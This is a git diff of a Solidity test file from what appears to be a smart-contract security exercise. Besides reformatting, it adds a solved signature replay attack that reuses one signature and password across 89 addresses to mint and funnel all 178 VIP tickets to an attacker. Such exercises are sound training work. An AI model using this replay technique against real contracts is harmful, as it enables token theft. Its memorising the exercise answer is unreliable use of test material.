@@ -15,8 +15,8 @@ import "src/replay-attack-3/RedHawksVIP.sol";
  */
 contract TestRA3 is Test {
     using ECDSA for bytes32;
-    bytes32 private constant _TYPE_HASH =
-        keccak256("EIP712Domain(uint256 chainId,address verifyingContract)");
+
+    bytes32 private constant _TYPE_HASH = keccak256("EIP712Domain(uint256 chainId,address verifyingContract)");
 
     address deployer;
     uint256 deployerKey;
@@ -33,17 +33,18 @@ contract TestRA3 is Test {
         redHawks = new RedHawksVIP(vouchersSigner);
 
         bytes32 dataHash = _hashTypedDataV4(
-            keccak256(abi.encode(
-                keccak256("VoucherData(uint256 amountOfTickets,string password)"),
-                2,
-                keccak256(bytes("RedHawksRulzzz133"))
-            ))
+            keccak256(
+                abi.encode(
+                    keccak256("VoucherData(uint256 amountOfTickets,string password)"),
+                    2,
+                    keccak256(bytes("RedHawksRulzzz133"))
+                )
+            )
         );
 
         // Create signatures
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, dataHash);
         bytes memory validSignature = abi.encodePacked(r, s, v); // Note: Order here should be different from line above
-
 
         (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(deployerKey, dataHash);
         bytes memory invalidSignature = abi.encodePacked(r2, s2, v2);
@@ -69,11 +70,31 @@ contract TestRA3 is Test {
     }
 
     function testRedHawks() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        string memory pass = "RedHawksRulzzz133";
+        bytes memory sig =
+            hex"f93808afc0281cb72eabdbe920612c259d68c66c00bfdfc86a6eaa2c69b84aad39ce44eb89c9ffc1bfb5da0a44a81ac1dcac4d90f2a53b4015bd0f1cc9762bcd1b";
 
-        /** SUCCESS CONDITIONS */
+        for (uint256 index = 0; index < 89; index++) {
+            string memory name = string(abi.encodePacked("EOA: ", uint256(index)));
+            uint256 currentsupply = redHawks.currentSupply();
 
-		// Attacker got all 178 VIP Membership Tickets
+            address someUser = makeAddr(name);
+
+            vm.startPrank(someUser);
+
+            redHawks.mint(2, pass, sig);
+            redHawks.transferFrom(someUser, attacker, 1 + currentsupply++);
+            redHawks.transferFrom(someUser, attacker, 1 + currentsupply++);
+        }
+
+        /**
+         * SUCCESS CONDITIONS
+         */
+
+        // Attacker got all 178 VIP Membership Tickets
         assertEq(redHawks.balanceOf(attacker), 178);
     }
 
@@ -82,9 +103,7 @@ contract TestRA3 is Test {
         return domainSeparatorHash;
     }
 
-    function _hashTypedDataV4(
-        bytes32 structHash
-    ) internal view virtual returns (bytes32) {
+    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {
         return ECDSA.toTypedDataHash(_domainSeparatorV4(), structHash);
     }
 }
